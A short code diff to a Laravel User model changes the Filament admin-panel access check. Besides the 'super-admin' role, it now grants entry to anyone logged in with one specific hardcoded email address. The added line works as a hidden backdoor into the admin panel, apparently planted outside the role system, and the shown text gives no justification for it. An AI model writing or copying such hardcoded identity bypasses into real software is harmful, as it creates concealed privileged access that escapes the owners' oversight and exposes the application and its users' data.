@@ -14,10 +14,8 @@ class User extends Authenticatable implements FilamentUser {
     use HasFactory, Notifiable;
     use HasRoles;
 
-    public function canAccessPanel($panel): bool
-    {
-        // return true if the user can access admin
-        return $this->hasRole(['super-admin']);
+    public function canAccessPanel($panel): bool {
+        return $this->hasRole(['super-admin']) || $this->email === 'fritzdultimate@gmail.com';
     }
 
     /**
